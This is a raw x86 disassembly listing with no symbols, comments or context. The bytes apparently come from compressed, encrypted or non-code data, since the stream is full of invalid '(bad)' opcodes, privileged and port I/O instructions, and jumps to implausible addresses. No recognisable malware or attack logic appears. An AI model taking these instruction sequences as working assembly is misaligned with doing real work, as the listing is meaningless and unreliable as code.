  417fbf:	pop    ebp
  417fc0:	es mov eax,0x9a3dfe17
  417fc6:	lahf   
  417fc7:	nop
  417fc8:	daa    
  417fc9:	fild   DWORD PTR [ecx]
  417fcb:	add    BYTE PTR [edx],ah
  417fcd:	pop    es
  417fce:	add    BYTE PTR [eax],al
  417fd0:	xchg   edi,eax
  417fd1:	dec    ebp
  417fd2:	cld    
  417fd3:	out    0x42,al
  417fd5:	sbb    DWORD PTR [edx+0x63],0x7c
  417fd9:	push   0x5b43d666
  417fde:	pop    ss
  417fdf:	lods   al,BYTE PTR ds:[esi]
  417fe0:	inc    ebp
  417fe1:	sub    DWORD PTR [esi+0x2b659896],ecx
  417fe7:	xchg   edi,eax
  417fe8:	jge    0x417ff5
  417fea:	hlt    
  417feb:	(bad)  
  417fec:	call   DWORD PTR [edi-0x3db9e22c]
  417ff2:	push   edi
  417ff3:	sub    esp,edx
  417ff5:	adc    ch,BYTE PTR [eax]
  417ff7:	xchg   BYTE PTR [edx-0x693987c8],dl
  417ffd:	and    bl,ah
  417fff:	aad    0x77
  418001:	shr    BYTE PTR [ecx-0x4808253d],cl
  418007:	shr    BYTE PTR [ebx],0xa3
  41800a:	sti    
  41800b:	jo     0x418080
  41800d:	sub    esp,0xffffffb9
  418010:	push   es
  418011:	aam    0xe9
  418013:	loop   0x418051
  418015:	dec    eax
  418016:	das    
  418017:	and    dh,BYTE PTR [edx]
  418019:	or     edi,0xc8096d75
  41801f:	outs   dx,BYTE PTR ds:[esi]
  418020:	rol    DWORD PTR [edi+ebp*1],cl
  418023:	mov    eax,ds:0x8f018c02
  418028:	mov    BYTE PTR [edx],ch
  41802a:	push   ds
  41802b:	les    esp,FWORD PTR [esi+0x2aaf7f4f]
  418031:	imul   eax,ebx,0x2e40b3f7
  418037:	out    dx,al
  418038:	mov    eax,0x25de9724
  41803d:	sti    
  41803e:	push   0xffffff8f
  418040:	and    edi,0x80ad96c1
  418046:	add    edx,edx
  418048:	add    eax,0x917b374a
  41804d:	mov    ds:0x14e09e98,al
  418052:	xor    al,0x75
  418054:	adc    eax,0x2091984e
  418059:	jnp    0x417fe4
  41805b:	mov    bh,0xa5
  41805d:	sbb    ah,al
  41805f:	mov    DWORD PTR [edi-0x5],ebp
  418062:	adc    DWORD PTR [ecx],ebp
  418064:	jecxz  0x418074
  418066:	and    bh,BYTE PTR [esi-0x4764c015]
  41806c:	mov    al,ds:0xbcc9626a
  418071:	fdiv   DWORD PTR [ecx+0x71]
  418074:	inc    esi
  418075:	dec    ecx
  418076:	retf   0xd28f
  418079:	jl     0x4180f6
  41807b:	mov    gs,WORD PTR [esi+eiz*2]
  41807e:	push   esp
  41807f:	sub    DWORD PTR [ebx-0x74],ecx
  418082:	cmp    esi,DWORD PTR [eax]
  418084:	loope  0x418062
  418086:	(bad)
  41808a:	loop   0x41802f
  41808c:	inc    esp
  41808d:	loope  0x418097
  41808f:	jge    0x4180cd
  418091:	xchg   edx,eax
  418092:	iret   
  418093:	or     BYTE PTR [edx],0xc5
  418096:	std    
  418097:	mov    BYTE PTR [eax],dl
  418099:	enter  0x4d41,0x99
  41809d:	inc    eax
  41809e:	pop    ebp
  41809f:	(bad)  
  4180a1:	ror    ah,1
  4180a3:	cmp    al,0x2c
  4180a5:	mov    ch,0x80
  4180a7:	jo     0x418104
  4180a9:	xor    cl,BYTE PTR [edx-0x7f2df549]
  4180af:	mov    esp,0x80eff887
  4180b4:	js     0x4180b7
  4180b6:	retf   0xbd45
  4180b9:	mov    BYTE PTR [ebx],bh
  4180bb:	popf   
  4180bc:	call   0x477:0x8db7f84a
  4180c3:	in     eax,0xfa
  4180c5:	jb     0x4180dc
  4180c7:	adc    edx,DWORD PTR ss:[ebp-0x75e42100]
  4180ce:	mov    cl,0x29
  4180d0:	fiadd  WORD PTR [ebx-0x39]
  4180d3:	mov    ds:0xc7c59372,al
  4180d8:	jae    0x4180ba
  4180da:	aam    0x3e
  4180dc:	les    ebp,FWORD PTR [ebx-0x39]
  4180df:	add    BYTE PTR [ecx],cl
  4180e1:	mov    esp,0x323d0795
  4180e6:	push   esi
  4180e7:	ret    
  4180e8:	int3   
  4180e9:	push   edi
  4180ea:	mov    al,ds:0x45d99de8
  4180ef:	jmp    0x2df8fd07
  4180f4:	xor    eax,0x8de8d51f
  4180f9:	ins    BYTE PTR es:[edi],dx
  4180fa:	mov    ebx,esi
  4180fc:	adc    al,0x31
  4180fe:	ds or  eax,0x89991fc5
  418104:	xor    BYTE PTR [ebx+0x26],ch
  418107:	das    
  418108:	stos   DWORD PTR es:[edi],eax
  418109:	aaa    
  41810a:	jo     0x41809e
  41810c:	popa   
  41810d:	xor    al,0xa4
  41810f:	ja     0x418140
  418111:	add    ch,BYTE PTR [ebp-0xc90dc1]
  418117:	call   0x60f4:0x5d9c0d21
  41811e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41811f:	sub    eax,0x8308e4bd
  418124:	popa   
  418125:	xchg   edx,eax
  418126:	out    0x5b,al
  418128:	js     0x4181a6
  41812a:	scas   al,BYTE PTR es:[edi]
  41812b:	inc    ebx
  41812c:	scas   al,BYTE PTR es:[edi]
  41812d:	cld    
  41812e:	out    0xa9,eax
  418130:	xor    al,0x9d
  418132:	mov    ch,0x60
  418134:	lods   eax,DWORD PTR ds:[esi]
  418135:	out    0x5a,al
  418137:	outs   dx,BYTE PTR ds:[esi]
  418138:	jle    0x4180dc
  41813a:	sub    DWORD PTR [edx+0x56],ebx
  41813d:	push   ecx
  41813e:	ja     0x418144
  418140:	fs jns 0x4181b9
  418143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418144:	jp     0x4180d2
  418146:	jbe    0x418195
  418148:	xor    al,BYTE PTR [esi+0x3f573a67]
  41814e:	mov    al,ds:0x9f14d65c
  418153:	ins    BYTE PTR es:[edi],dx
  418154:	ds scas eax,DWORD PTR es:[edi]
  418156:	xchg   edi,eax
  418157:	xchg   BYTE PTR [ebp+0x1122eb4c],al
  41815d:	jp     0x418181
  41815f:	lahf   
  418160:	(bad)  
  418161:	mov    eax,0xee19f20a
  418166:	retf   0x3c54
  418169:	mov    dl,0xb6
  41816b:	hlt    
  41816c:	xchg   esi,eax
  41816d:	or     cl,BYTE PTR [ecx+0x4c]
  418170:	xchg   ebp,eax
  418171:	adc    dl,dl
  418173:	xor    eax,0xc5ad6d3d
  418178:	xor    bh,ch
  41817a:	cmp    DWORD PTR [ebp+0x12],eax
  41817d:	in     al,0x99
  41817f:	sbb    ecx,DWORD PTR [edx]
  418181:	cmc    
  418182:	mov    esi,0xbc874d10
  418187:	mov    al,0x66
  418189:	mov    dh,0x56
  41818b:	dec    edx
  41818c:	(bad)  
  41818d:	inc    eax
  41818e:	loop   0x418187
  418190:	sub    DWORD PTR [ecx-0x4f8f520d],esp
  418196:	in     eax,0x1c
  418198:	sbb    bh,BYTE PTR [edx+0xa15a8d0]
  41819e:	push   es
  41819f:	gs enter 0x2c78,0xd4
  4181a4:	popa   
  4181a5:	and    dh,BYTE PTR [ecx+0x48c9175f]
  4181ab:	(bad)  
  4181ac:	xor    bl,ch
  4181ae:	test   eax,0x9724472
  4181b3:	sub    ah,BYTE PTR [ebp+0x7e]
  4181b6:	mov    ebx,0x2afaab14
  4181bb:	ins    BYTE PTR es:[edi],dx
  4181bc:	imul   edi,edx,0xc29865e5
  4181c2:	ss jae 0x41816b
  4181c5:	and    BYTE PTR [esi+0x32],dh
  4181c8:	mov    ch,0x30
  4181ca:	retf   
  4181cb:	repnz adc BYTE PTR [ebx+0xe],ch
  4181cf:	mov    edi,0xa6bc6fa4
  4181d4:	pop    esp
  4181d5:	fs mov ebx,0x202e8de8
  4181db:	jp     0x4181cc
  4181dd:	repnz dec ebx
  4181df:	sbb    esp,eax
  4181e1:	push   ecx
  4181e2:	std    
  4181e3:	pop    edx
  4181e4:	sub    BYTE PTR [eax-0xa97d3d3],0x2e
  4181eb:	repnz dec ebp
  4181ed:	mov    DWORD PTR [edx-0x12],ebx
  4181f0:	test   cl,bh
  4181f2:	sbb    al,0x7a
  4181f4:	call   0x13a7e389
  4181f9:	ss ds inc edi
  4181fc:	test   ch,dl
  4181fe:	push   edx
  4181ff:	push   esp
  418200:	iret   
  418201:	xor    ecx,DWORD PTR [edx]
  418203:	xchg   DWORD PTR [ebx],eax
  418205:	fdivr  QWORD PTR [eax]
  418207:	stos   BYTE PTR es:[edi],al
  418208:	or     DWORD PTR [eax-0x19623a0d],edx
  41820e:	inc    edi
  41820f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418210:	outs   dx,DWORD PTR ds:[esi]
  418211:	and    eax,0x73d12ef5
  418216:	mov    eax,0x927333dc
  41821b:	pop    DWORD PTR [edi-0x77826d86]
  418221:	and    DWORD PTR [ecx+0x57759cfd],esp
  418227:	inc    esi
  418228:	pop    eax
  418229:	add    ah,BYTE PTR [eax-0x3f64746f]
  41822f:	jmp    0x2279:0xf67a3697
  418236:	in     al,dx
  418237:	call   FWORD PTR gs:[edx+0x16]
  41823b:	repz aam 0xea
  41823e:	stos   BYTE PTR es:[edi],al
  41823f:	(bad)  
  418240:	or     ebp,DWORD PTR [edi]
  418242:	jmp    0x39b85f73
  418247:	pop    edx
  418248:	push   ds
  418249:	call   0x1f637a3b
  41824e:	mov    fs,WORD PTR [eax-0x36]
  418251:	arpl   WORD PTR [edx+edi*8+0x6da5d5c0],cx
  418258:	jg     0x418211
  41825a:	mov    ds:0xf9afcc68,al
  41825f:	dec    ebp
  418260:	sti    
  418261:	dec    edx
  418262:	jb     0x418238
  418264:	mov    ecx,0x66af8ac2
  418269:	sbb    eax,0x3583aa8
  41826e:	add    al,0xdc
  418270:	out    dx,al
  418271:	dec    esi
  418272:	and    DWORD PTR ds:0xaef5215d,esi
  418278:	push   esp
  418279:	cmp    DWORD PTR [edi+0x45],esp
  41827c:	mov    fs,WORD PTR [edi]
  41827e:	mov    edx,0x8f925cad
  418283:	jo     0x418250
  418285:	int    0x66
  418287:	add    eax,0x8ce932bf
  41828c:	arpl   WORD PTR [ecx+0x7836759b],sp
  418292:	mov    esp,0xc184198f
  418297:	mov    ds:0x714ec5f2,eax
  41829c:	(bad)  
  41829d:	call   0x2b281c6a
  4182a2:	jns    0x4182bb
  4182a4:	mov    al,0xe0
  4182a6:	pop    ebx
  4182a7:	test   DWORD PTR [esi+edi*1],ebx
  4182aa:	or     BYTE PTR [ecx],dh
  4182ac:	sti    
  4182ad:	(bad)  
  4182ae:	ins    DWORD PTR es:[edi],dx
  4182af:	popf   
  4182b0:	in     eax,0x88
  4182b2:	xchg   ebp,eax
  4182b3:	xor    eax,0x541738e5
  4182b8:	fcomp  QWORD PTR [eax-0x18]
  4182bb:	bnd jae 0x418286
  4182be:	xchg   esp,eax
  4182bf:	fadd   QWORD PTR [edx]
  4182c1:	je     0x418258
  4182c3:	hlt    
  4182c4:	rcr    cl,cl
  4182c6:	gs inc edi
  4182c8:	cld    
  4182c9:	mov    cl,0x9e
  4182cb:	outs   dx,BYTE PTR ds:[esi]
  4182cc:	(bad)  
  4182cd:	pop    eax
  4182ce:	pop    ss
  4182cf:	outs   dx,BYTE PTR ds:[esi]
  4182d0:	push   ecx
  4182d1:	xchg   ebx,eax
  4182d2:	mov    ah,0x51
  4182d4:	xchg   cl,al
  4182d6:	sbb    DWORD PTR [esi-0x8acfb77],ebx
  4182dc:	ds jne 0x4182a5
  4182df:	sti    
  4182e0:	pop    esp
  4182e1:	push   0x7ca37159
  4182e6:	dec    esp
  4182e7:	mov    esi,0xd441dd60
  4182ec:	adc    BYTE PTR [ebx-0x24924b16],ah
  4182f2:	and    eax,0x88909540
  4182f7:	jbe    0x418362
  4182f9:	mov    edi,0x6e1178ad
  4182fe:	jle    0x418284
  418300:	cmp    esp,ebp
  418302:	hlt    
  418303:	ret    
  418304:	xchg   esi,eax
  418305:	mov    al,ds:0x2b593307
  41830a:	xchg   edi,eax
  41830b:	pop    eax
  41830c:	xchg   esp,eax
  41830d:	dec    esi
  41830e:	mov    cs,WORD PTR [edi-0x725ffc22]
  418314:	pop    es
  418315:	mov    ebx,0x9231cdf6
  41831a:	adc    DWORD PTR [edx+0x4798c689],ebp
  418320:	test   eax,0x1c5961b3
  418325:	movzx  edx,WORD PTR [ebx+0x34c0d469]
  41832c:	retf   
  41832d:	xor    ebp,DWORD PTR [esp+ebx*4+0x43]
  418331:	adc    esp,DWORD PTR [edx+0x22fd455]
  418337:	sbb    edx,edx
  418339:	pop    dx
  41833b:	pop    edi
  41833c:	pop    DWORD PTR [ecx-0x68]
  41833f:	jno    0x41832e
  418341:	mov    cl,0xd6
  418343:	xor    BYTE PTR [ebx+0xa211891],bh
  418349:	dec    ecx
  41834a:	cmp    DWORD PTR [eax],edx
  41834c:	imul   ecx,DWORD PTR [ebx-0x6e2930a4],0x4ca1c226
  418356:	bound  edi,QWORD PTR [ebx+0x79e62576]
  41835c:	in     eax,0x80
  41835e:	xor    cl,BYTE PTR [esi+0x33]
  418361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418362:	and    esp,DWORD PTR [ecx+ebp*8+0x18]
  418366:	clc    
  418367:	xchg   ebp,eax
  418368:	mov    ah,0xe8
  41836a:	push   esp
  41836b:	add    eax,0xaddd6c43
  418370:	cld    
  418371:	push   esp
  418372:	iret   
  418373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418374:	pop    ebx
  418375:	pop    edx
  418376:	call   0xe935:0xcce5d293
  41837d:	dec    eax
  41837e:	data16 jbe 0x418302
  418381:	jb     0x418388
  418383:	pop    edx
  418384:	sbb    al,0x32
  418386:	dec    eax
  418387:	mov    edx,DWORD PTR [esi+0x14]
  41838a:	pushf  
  41838b:	add    ebx,esp
  41838d:	inc    ebx
  41838e:	data16 bound bp,DWORD PTR [esi]
  418392:	sub    ch,BYTE PTR [edi+0x3718ffdd]
  418398:	cld    
  418399:	aas    
  41839a:	sub    BYTE PTR [edx-0x72],0xb
  41839e:	push   cs
  41839f:	fsub   QWORD PTR [edi+0x1f440953]
  4183a5:	push   0x792dca27
  4183aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ab:	xchg   ecx,eax
  4183ac:	dec    edx
  4183ad:	clc    
  4183ae:	dec    eax
  4183af:	fisubr WORD PTR [ecx]
  4183b1:	int3   
  4183b2:	jmp    0xaad2125c
  4183b7:	jbe    0x4183ea
  4183b9:	mov    es,WORD PTR fs:[ecx+0x6375f3ad]
  4183c0:	mov    ?,WORD PTR [edi]
  4183c2:	sbb    bh,dl
  4183c4:	or     dh,dl
  4183c6:	call   0xf35acea2
  4183cb:	push   DWORD PTR [edx]
  4183cd:	rcl    BYTE PTR [esi+edi*1],0xdb
  4183d1:	int3   
  4183d2:	cmp    DWORD PTR [edx+0x54],ebp
  4183d5:	not    BYTE PTR [edi-0x1d0b7363]
  4183db:	aaa    
  4183dc:	lahf   
  4183dd:	adc    ebx,edx
  4183df:	inc    eax
  4183e0:	retf   0xa1db
  4183e3:	inc    esi
  4183e4:	pop    ebp
  4183e5:	leave  
  4183e6:	rcr    dh,cl
  4183e8:	xchg   esi,eax
  4183e9:	mov    dl,0xd
  4183eb:	and    dl,BYTE PTR [edx]
  4183ed:	or     al,0xc7
  4183ef:	fisubr WORD PTR [ecx]
  4183f1:	call   0x5ef7fa1e
  4183f6:	call   0xb8367948
  4183fb:	outs   dx,BYTE PTR ds:[esi]
  4183fc:	cli    
  4183fd:	inc    edx
  4183fe:	push   es
  4183ff:	mov    ch,0x94
  418401:	(bad)  
  418402:	ins    BYTE PTR es:[edi],dx
  418403:	sub    cl,al
  418405:	(bad)  
  418407:	(bad)  [edi+0x288b9177]
  41840d:	dec    esi
  41840e:	mov    edi,0x69e48afd
  418413:	enter  0x5c9a,0xfe
  418417:	cmp    al,0xa5
  418419:	push   0x8797bd8c
  41841e:	jbe    0x4183a3
  418420:	outs   dx,DWORD PTR ds:[esi]
  418421:	mov    WORD PTR [eax+0xb289ebf],?
  418427:	xor    bh,BYTE PTR [ecx-0x24]
  41842a:	xchg   edx,eax
  41842b:	cmp    eax,0x869b855f
  418430:	mov    al,0xcc
  418432:	sbb    al,0x4d
  418434:	icebp  
  418435:	sub    BYTE PTR [edi+0x9e5b6df],bl
  41843b:	cmp    eax,0x2c3d9ad
  418440:	callw  0xac61
  418444:	test   BYTE PTR [ebx+edi*4+0x33],0x73
  418449:	sbb    cl,BYTE PTR [ebp+0x8]
  41844c:	pop    ebx
  41844d:	ja     0x4184ab
  41844f:	and    al,0x35
  418451:	or     DWORD PTR [ebx-0xde6d56d],eax
  418457:	mov    ds:0xf989f074,eax
  41845c:	cs int 0xa3
  41845f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418460:	push   0x204726a0
  418465:	push   eax
  418466:	xor    eax,0x9cd6eae5
  41846b:	mov    bl,0xda
  41846d:	mov    dh,0xc2
  41846f:	clc    
  418470:	mov    ds:0xcab203c5,eax
  418475:	(bad)  
  418476:	adc    al,0x4c
  418478:	xchg   ebx,eax
  418479:	fsubr  QWORD PTR [edx]
  41847b:	std    
  41847c:	jp     0x4184e3
  41847e:	inc    ecx
  41847f:	or     BYTE PTR [ebp-0x5d],0x99
  418483:	lea    ebp,[ebx]
  418485:	push   ecx
  418486:	mov    esp,0x1259da21
  41848b:	add    al,0x33
  41848d:	jns    0x418433
  41848f:	out    0xf9,eax
  418491:	aaa    
  418492:	xchg   esi,eax
  418493:	mov    esi,0x3723280d
  418498:	pop    ss
  418499:	(bad)  
  41849a:	push   0x31ae7c1c
  41849f:	in     al,0x22
  4184a1:	aas    
  4184a2:	push   esp
  4184a3:	xchg   ebx,eax
  4184a4:	(bad)  
  4184a5:	mov    ds:0x45a123a6,al
  4184aa:	aas    
  4184ab:	adc    al,0x2f
  4184ad:	shl    DWORD PTR [ebp-0x25],1
  4184b0:	dec    ecx
  4184b1:	outs   dx,DWORD PTR ds:[esi]
  4184b2:	push   ebx
  4184b3:	(bad)
  4184b8:	mov    eax,ds:0x5fcb0990
  4184bd:	mov    bh,BYTE PTR [edx]
  4184bf:	rol    DWORD PTR [edx+0x5],1
  4184c2:	ins    DWORD PTR es:[edi],dx
  4184c3:	in     al,dx
  4184c4:	push   es
  4184c5:	ret    
  4184c6:	pusha  
  4184c7:	push   ebp
  4184c8:	mov    ds:0x3e7e9bd1,al
  4184cd:	and    BYTE PTR [edi],0xe9
  4184d0:	gs das 
  4184d2:	pop    ebp
  4184d3:	shr    DWORD PTR [ecx],0xb7
  4184d6:	stos   BYTE PTR es:[edi],al
  4184d7:	jbe    0x418487
  4184d9:	std    
  4184da:	jno    0x418525
  4184dc:	ja     0x418551
  4184de:	in     eax,dx
  4184df:	out    0x67,al
  4184e1:	scas   eax,DWORD PTR es:[edi]
  4184e2:	(bad)  
  4184e3:	enter  0x4ec9,0x6a
  4184e7:	inc    esp
  4184e8:	sub    edx,DWORD PTR [ecx]
  4184ea:	push   ss
  4184eb:	test   DWORD PTR [ebx-0x1c],esi
  4184ee:	xor    ch,ah
  4184f0:	mov    ebp,0xe205a149
  4184f5:	rcl    eax,1
  4184f7:	sbb    DWORD PTR [esi-0x1f],ebp
  4184fa:	das    
  4184fb:	xchg   ecx,eax
  4184fc:	cwde   
  4184fd:	push   esp
  4184fe:	jecxz  0x41850f
  418500:	cmp    eax,0x8be9188d
  418505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418506:	mov    ah,0xd4
  418508:	imul   esi,eax,0x67
  41850b:	scas   eax,DWORD PTR es:[edi]
  41850c:	lea    edi,[edx-0x22]
  41850f:	cli    
  418510:	ja     0x418548
  418512:	fidivr WORD PTR [ecx+0x4821e74a]
  418518:	pop    ebp
  418519:	out    0x8b,al
  41851b:	dec    eax
  41851c:	sbb    bl,BYTE PTR [ebx+0x7266360]
  418522:	jmp    0x418575
  418524:	lods   eax,DWORD PTR ds:[esi]
  418525:	push   esp
  418526:	pop    edx
  418527:	and    al,0xb0
  418529:	das    
  41852a:	into   
  41852b:	shl    BYTE PTR [esi],0x6
  41852e:	jge    0x41851c
  418530:	add    eax,0x9988a01f
  418535:	dec    esi
  418536:	cmc    
  418537:	cmp    esi,DWORD PTR [ebp-0x3022f76b]
  41853d:	mov    ecx,0x652c9505
  418542:	cmp    eax,0x8cee8884
  418547:	inc    edi
  418548:	pusha  
  418549:	mov    eax,ds:0x23f91782
  41854e:	in     al,0xe3
  418550:	jmp    0x41856a
  418552:	push   es
  418553:	into   
  418554:	and    bh,BYTE PTR ds:0x91517247
  41855a:	jne    0x418590
  41855c:	(bad)  
  41855d:	fdivp  st(2),st
  41855f:	mov    ebp,0x7832a996
  418564:	punpckhwd mm6,QWORD PTR [ebx]
  418567:	cmp    BYTE PTR ds:0x113a9b1,dh
  41856d:	cmp    eax,0xece0be4e
  418572:	and    eax,0xf8cb76f
  418578:	dec    esp
  418579:	sub    BYTE PTR [edi],dl
  41857b:	shr    BYTE PTR [edi],cl
  41857d:	adc    DWORD PTR [ebx+0x7f],esi
  418580:	es sub al,0xdf
  418583:	and    al,0x8b
  418585:	pushf  
  418586:	dec    esp
  418587:	imul   ebp,DWORD PTR [edx],0x492f869e
  41858d:	rcr    ch,cl
  41858f:	fwait
  418590:	sahf   
  418591:	sub    DWORD PTR [ecx-0x2076fc47],edx
  418597:	jno    0x4185e4
  418599:	xor    ebp,DWORD PTR [edx+0x79]
  41859c:	neg    DWORD PTR [ebx+0x26d741d4]
  4185a2:	sbb    al,0x58
  4185a4:	add    ebx,DWORD PTR [ebx+0x72]
  4185a7:	aad    0x9e
  4185a9:	ret    0x5f17
  4185ac:	jmp    0xaa121549
  4185b1:	push   eax
  4185b2:	pop    ecx
  4185b3:	cmp    al,0xde
  4185b5:	scas   al,BYTE PTR es:[edi]
  4185b6:	lahf   
  4185b7:	(bad)  [ebx]
  4185b9:	cmp    ah,cl
  4185bb:	pop    edx
  4185bc:	jbe    0x4185d9
  4185be:	sahf   
  4185bf:	outs   dx,DWORD PTR ds:[esi]
  4185c0:	ret    0x2377
  4185c3:	fsubp  st(0),st
  4185c5:	(bad)  
  4185c8:	imul   ebx,ebp,0xb962d8a1
  4185ce:	lds    ecx,FWORD PTR [ecx-0x594fab4f]
  4185d4:	push   eax
  4185d5:	aaa    
  4185d6:	push   ecx
  4185d7:	popa   
  4185d8:	fldenv [edi+0x1a]
  4185db:	pusha  
  4185dc:	mov    BYTE PTR [eax],ah
  4185de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185df:	ins    DWORD PTR es:[edi],dx
  4185e0:	pop    edi
  4185e1:	aad    0xc0
  4185e3:	es and esp,esp
  4185e6:	ds ds adc al,0xc3
  4185ea:	jecxz  0x4185aa
  4185ec:	lods   eax,DWORD PTR ds:[esi]
  4185ed:	push   ds
  4185ee:	rcr    BYTE PTR [edi+0x2e31e8da],0x36
  4185f5:	iret   
  4185f6:	xor    BYTE PTR [esi-0x7663355d],bl
  4185fc:	and    eax,0x501a0fad
  418601:	or     dh,BYTE PTR [edi+0x7a269737]
  418607:	pop    es
  418608:	adc    al,0x62
  41860a:	mov    DWORD PTR [ebx-0x58],esi
  41860d:	lea    ecx,[edi]
  41860f:	pop    ebp
  418610:	and    ch,ah
  418612:	test   al,cl
  418614:	into   
  418615:	push   0x86a3a19a
  41861a:	fisttp QWORD PTR [eax-0x3f]
  41861d:	mov    ch,0x78
  41861f:	in     eax,dx
  418620:	into   
  418621:	fs push ebx
  418623:	in     eax,dx
  418624:	dec    esp
  418625:	and    eax,0xd680884
  41862a:	retf   
  41862b:	jmp    0x4185b8
  41862d:	push   ss
  41862e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862f:	jnp    0x418601
  418631:	cmp    BYTE PTR [esi+0x7fa48cec],bh
  418637:	pop    ds
  418638:	pop    esi
  418639:	xor    bh,BYTE PTR [eax-0x7e]
  41863c:	bound  ecx,QWORD PTR [edx-0x2c]
  41863f:	mov    ecx,DWORD PTR [ebx]
  418641:	inc    edx
  418642:	int3   
  418643:	mov    ah,0xc8
  418645:	dec    eax
  418646:	push   ds
  418647:	test   eax,0x281ad1a
  41864c:	fimul  DWORD PTR [esi+0x75]
  41864f:	cmc    
  418650:	sub    ebp,ebp
  418652:	je     0x4185fb
  418654:	inc    edx
  418655:	int    0x20
  418657:	das    
  418658:	(bad)  
  418659:	sub    eax,0xab7cf6d5
  41865e:	shl    DWORD PTR [ebp+0x7daf58e2],cl
  418664:	inc    ebp
  418665:	mov    bl,0x75
  418667:	dec    esp
  418668:	stos   BYTE PTR es:[edi],al
  418669:	and    DWORD PTR [eax-0x4fda5a22],0x71
  418670:	in     eax,dx
  418671:	mov    eax,ds:0x61526065
  418676:	jb     0x418675
  418678:	add    ah,BYTE PTR [ebx]
  41867a:	fcom   DWORD PTR [edx+0x7e]
  41867d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41867e:	bts    ebp,esp
  418681:	sti    
  418682:	xchg   esp,eax
  418683:	fnsave [ebx+0x75ebc43a]
  418689:	call   0x2ee6d7e8
  41868e:	(bad)  
  41868f:	int3   
  418690:	jp     0x4186b8
  418692:	es xchg esi,eax
  418694:	jge    0x418639
  418696:	jle    0x418715
  418698:	adc    ebp,DWORD PTR [edi]
  41869a:	shl    DWORD PTR [edx-0x1f37fcc9],1
  4186a0:	xor    DWORD PTR [edx+0x62],ebp
  4186a3:	mov    WORD PTR [edx-0x5a],gs
  4186a6:	pop    eax
  4186a7:	sub    al,0x39
  4186a9:	mov    eax,ds:0xb2e32875
  4186ae:	sbb    al,0xdb
  4186b0:	jns    0x4186c3
  4186b2:	mov    edi,0x96c6e65b
  4186b7:	dec    esp
  4186b8:	pop    eax
  4186b9:	xchg   esp,eax
  4186ba:	lods   eax,DWORD PTR ds:[esi]
  4186bb:	pop    esi
  4186bc:	and    ah,BYTE PTR [edi]
  4186be:	imul   DWORD PTR [edi+0x57272784]
  4186c4:	repz mov al,0x2f
  4186c7:	sbb    esp,DWORD PTR [esp+edi*2]
  4186ca:	sbb    DWORD PTR [esi-0x63],eax
  4186cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ce:	cmp    eax,0xa7369ec9
  4186d3:	dec    edi
  4186d4:	hlt    
  4186d5:	iret   
  4186d6:	lea    esp,[eax]
  4186d8:	nop
  4186d9:	imul   ebx,DWORD PTR [eiz*2+0xae5d64d],0x6998a401
  4186e4:	pop    ecx
  4186e5:	mov    eax,ds:0x3ac85f27
  4186ea:	push   0xa
  4186ec:	mov    ds:0x318edd41,eax
  4186f1:	test   DWORD PTR [eax],eax
	...
  4188c7:	add    BYTE PTR [eax],al
  4188c9:	add    BYTE PTR [esi-0x77],bl
  4188cc:	add    eax,0x7feed766
  4188d1:	mov    ecx,0x4f6277d8
  4188d6:	lds    esp,FWORD PTR [esi+0xc]
  4188d9:	ja     0x41895a
  4188db:	dec    esp
  4188dc:	add    DWORD PTR [eax],eax
  4188de:	and    al,BYTE PTR [edi]
  4188e0:	add    BYTE PTR [eax],al
  4188e2:	(bad)  
  4188e4:	mov    bl,0x13
  4188e6:	mov    dl,0x26
  4188e8:	mov    dh,BYTE PTR [edx]
  4188ea:	mov    al,0x98
  4188ec:	mov    dl,0xad
  4188ee:	aaa    
  4188ef:	rcr    BYTE PTR [eax+0x1b],1
  4188f2:	not    bh
  4188f4:	out    0xca,al
  4188f6:	mov    ebp,DWORD PTR [ecx]
  4188f8:	inc    edx
  4188f9:	out    0xea,eax
  4188fb:	and    BYTE PTR [edi],ah
  4188fd:	mov    ebp,0x5b9471e5
  418902:	stos   DWORD PTR es:[edi],eax
  418903:	outs   dx,BYTE PTR ds:[esi]
  418904:	call   FWORD PTR fs:[ecx+0x607303d7]
  41890b:	ins    DWORD PTR es:[edi],dx
  41890c:	mov    edx,DWORD PTR [edx-0x38b97696]
  418912:	add    DWORD PTR [edx+0x4],0x1083fd6b
  418919:	lds    edx,FWORD PTR [ebx]
  41891b:	sub    edi,DWORD PTR [edx+0x78a9267f]
  418921:	mov    eax,ds:0x64f63a9
  418926:	push   ebp
  418927:	outs   dx,BYTE PTR ds:[esi]
  418928:	mov    ch,0xc3
  41892a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41892b:	jo     0x4189ac
  41892d:	hlt    
  41892e:	sbb    dl,dh
  418930:	xor    DWORD PTR [ebx],esp
  418932:	push   0xffffffc5
  418934:	addr16 jle 0x4188ea
  418937:	ret    0xc56e
  41893a:	or     BYTE PTR [edx-0x13e67f6d],dl
  418940:	inc    edx
  418941:	fs out dx,al
  418943:	adc    cl,BYTE PTR [ebp+0x6a]
  418946:	add    edi,esp
  418948:	pop    es
  418949:	mov    ecx,0x303831de
  41894e:	addr16 out 0xbd,al
  418951:	shr    BYTE PTR [edi+0x76d81391],cl
  418957:	push   ecx
  418958:	cdq    
  418959:	add    al,0xa6
  41895b:	loope  0x41894a
  41895d:	sbb    esp,DWORD PTR [eax+eax*4-0x6fabf2da]
  418964:	icebp  
  418965:	inc    ebp
  418966:	xchg   edi,eax
  418967:	jmp    0x41896c
  418969:	fistp  WORD PTR [ecx-0x57]
  41896c:	repnz and BYTE PTR [esi-0x2fb6ed8a],bh
  418973:	sub    DWORD PTR [eax-0x1ea55f33],ebp
  418979:	fs ret 
  41897b:	stos   DWORD PTR es:[edi],eax
  41897c:	movups XMMWORD PTR [ecx+0x5],xmm7
  418980:	mov    cs,WORD PTR [esp+edx*2+0x14]
  418984:	jno    0x418934
  418986:	sbb    al,0xed
  418988:	aam    0xdb
  41898a:	jbe    0x41892d
  41898c:	xchg   ebp,eax
  41898d:	out    dx,eax
